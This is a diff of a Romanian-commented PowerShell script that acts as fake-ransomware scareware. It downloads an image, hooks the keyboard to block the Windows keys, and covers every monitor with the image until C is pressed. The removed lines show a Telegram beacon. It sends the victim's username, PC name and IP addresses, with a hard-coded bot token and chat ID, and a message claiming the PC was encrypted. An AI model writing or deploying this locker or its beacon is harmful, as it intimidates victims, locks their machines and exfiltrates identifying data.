@@ -2,57 +2,17 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
+# Descărcare imagine
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
     } catch {
+        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
         exit
     }
 }
 
-function Send-Telegram-Message {
-    $pc = $env:COMPUTERNAME
-    $user = $env:USERNAME
-
-    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
-        Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
-
-    try {
-        $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
-    } catch {
-        $ipPublic = "n/a"
-    }
-
-    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
-    $uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
-    $body = @{ chat_id = '656189986'; text = $message } | ConvertTo-Json -Compress
-
-    try {
-        Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
-    } catch {}
-}
-
-function Start-Telegram-Listener {
-    $uriGet = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/getUpdates'
-    $lastUpdateId = 0
-
-    while ($true) {
-        try {
-            $response = Invoke-RestMethod -Uri $uriGet -TimeoutSec 5
-            foreach ($update in $response.result) {
-                if ($update.update_id -gt $lastUpdateId) {
-                    $lastUpdateId = $update.update_id
-                    $txt = $update.message.text
-                    if ($txt -eq "❤️" -or $txt -like "*❤*") {
-                        [Environment]::Exit(0)
-                    }
-                }
-            }
-        } catch {}
-        Start-Sleep -Seconds 2
-    }
-}
-
+# Blocare taste Windows și monitorizare pentru închidere
 function Block-And-MonitorKeys {
     Add-Type @"
         using System;
@@ -60,17 +20,23 @@ function Block-And-MonitorKeys {
 
         public class KeyboardMonitor {
             private static IntPtr hookId = IntPtr.Zero;
+
             private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
             private static LowLevelKeyboardProc proc = HookCallback;
+
             private const int WH_KEYBOARD_LL = 13;
             private const int WM_KEYDOWN = 0x0100;
 
             [DllImport("user32.dll")]
             private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
             [DllImport("user32.dll")]
             private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
             [DllImport("user32.dll")]
             private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
             [DllImport("kernel32.dll")]
             private static extern IntPtr GetModuleHandle(string lpModuleName);
 
@@ -90,26 +56,27 @@ function Block-And-MonitorKeys {
             }
 
             private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-                if (nCode >= 0 && wParam -eq (IntPtr)WM_KEYDOWN) {
-                    int vkCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
+                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+                    int vkCode = Marshal.ReadInt32(lParam);
 
-                    # Tasta C
-                    if ($vkCode -eq 0x43) {
-                        [Environment]::Exit(0)
+                    // Verifică dacă tasta C este apăsată
+                    if (vkCode == 0x43) { // Cod ASCII pentru tasta C
+                        Environment.Exit(0); // Închide scriptul
                     }
 
-                    # Tasta Windows stânga și dreapta
-                    if ($vkCode -eq 0x5B -or $vkCode -eq 0x5C) {
-                        return [IntPtr]1
+                    // Blochează tastele Windows (stânga/dreapta)
+                    if (vkCode == 0x5B || vkCode == 0x5C) {
+                        return (IntPtr)1;
                     }
                 }
-                return CallNextHookEx(hookId, nCode, wParam, lParam)
+                return CallNextHookEx(hookId, nCode, wParam, lParam);
             }
         }
 "@
     [KeyboardMonitor]::BlockAndMonitor()
 }
 
+# Afișare imagine pe toate monitoarele
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
@@ -132,6 +99,7 @@ function Show-FullScreenImage {
         try {
             $img = [System.Drawing.Image]::FromFile($tempImagePath)
         } catch {
+            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
             exit
         }
 
@@ -144,14 +112,14 @@ function Show-FullScreenImage {
         $forms += $form
     }
 
-    foreach ($form in $forms) { [void]$form.Show() }
+    foreach ($form in $forms) {
+        [void]$form.Show()
+    }
 
-    # Ascultă mesajele Telegram direct în thread principal
-    Start-Telegram-Listener
     [System.Windows.Forms.Application]::Run()
 }
 
+# Execuție principală
 Download-Image
-Send-Telegram-Message
 Block-And-MonitorKeys
 Show-FullScreenImage
